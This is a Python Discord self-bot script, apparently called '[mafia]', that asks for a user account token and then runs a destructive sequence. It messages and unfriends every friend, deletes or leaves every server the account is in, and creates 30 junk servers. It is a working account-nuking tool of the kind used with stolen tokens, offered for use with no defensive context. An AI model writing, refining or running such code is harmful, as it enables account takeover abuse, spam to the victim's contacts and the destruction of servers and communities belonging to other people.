def warn(*args, **kwargs):
    pass
import warnings
warnings.warn = warn
import discord
from discord.ext import commands
from colorama import Fore, init
import time
import sys
import os
import discord
import shutil
center = shutil.get_terminal_size().columns

init(autoreset=True)
gray = Fore.BLUE
intents = discord.Intents.all()

guild1 = f"{gray}[  {gray}Guild{gray}  ]"
guild2 = f"{gray}[  {gray}Guild{gray}  ]"
friends1 = f"{gray}[ {gray}Friends{gray} ]"
friends2 = f"{gray}[ {gray}Friends{gray} ]"

status1 = f"{gray}[ {gray}Status{gray}  ]"
status2 = f"{gray}[ {gray}Status{gray}  ]"

delete = f"[{gray}-{gray}]{gray}"
create = f"[{gray}+{gray}]{gray}"



bot = commands.Bot(command_prefix=">", case_insensitive=True, intents=discord.Intents.all(), self_bot=True)

os.system('cls && title [mafia] by dior - Main Menu')

buh = '''
███╗   ███╗ █████╗ ███████╗██╗ █████╗ 
████╗ ████║██╔══██╗██╔════╝██║██╔══██╗
██╔████╔██║███████║█████╗  ██║███████║
██║╚██╔╝██║██╔══██║██╔══╝  ██║██╔══██║
██║ ╚═╝ ██║██║  ██║██║     ██║██║  ██║
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝
                                      
'''
print(' by dior')
for line in buh.splitlines():
    print(f'\033[0;34m {line}'.center(center).replace("█",f"\033[0m█\033[0;34m"))

print(f"{gray}[{gray}?{gray}]{gray} Token: ", end="")
TOKEN = input()
print(f"{gray}[{gray}?{gray}]{gray} Guild Names: ", end="")
GUILD_NAMES = input()
print(f"{gray}[{gray}?{gray}]{gray} DM Message: ", end="")
DM_MESSAGE = input()
print(f"{gray}[{gray}?{gray}]{gray} Template Code (enter to skip): ", end="")
template_code = input().strip("https://discord.new/")
if template_code == "":
    template_code = None

@bot.event
async def on_ready():
    print(f"{gray}[{gray}+{gray}]{gray} Type >c anywhere to start.")

@bot.command()
async def c(ctx):
    for user in bot.user.relationships:
        if user.type == discord.RelationshipType.friend:
            try:
                user = bot.get_user(user.user.id)
                await user.send(DM_MESSAGE)
                await user.remove_friend()
                print(f"{friends1} {delete} {user.name}#{user.discriminator}")
            except:
                print(f"{friends2} {delete} {user.name}#{user.discriminator}")
    for guild in bot.guilds:
        try:
            await guild.delete()
            print(f"{guild1} {delete} {guild.name}")
        except:
            try:
                await guild.leave()
                print(f"{guild1} {delete} {guild.name}")
            except:
                print(f"{guild2} {delete} {guild.name}")
    for x in range(30):
        try:
            await bot.create_guild(name=GUILD_NAMES, code=template_code)
            print(f"{guild1} {create} {GUILD_NAMES}")
        except:
            print(f"{guild2} {create} {GUILD_NAMES}")

try:
    bot.run(TOKEN, bot=False)
except discord.errors.LoginFailure as e:
    print(f"{gray}[!]{gray} Invalid Token. Account Tokens Only.")
    print(e)
    time.sleep(5)
    sys.exit()
except Exception as e:
    print(f"{gray}[!]{gray} Unknown Error. Debug: {e}")
    time.sleep(5)
    sys.exit()
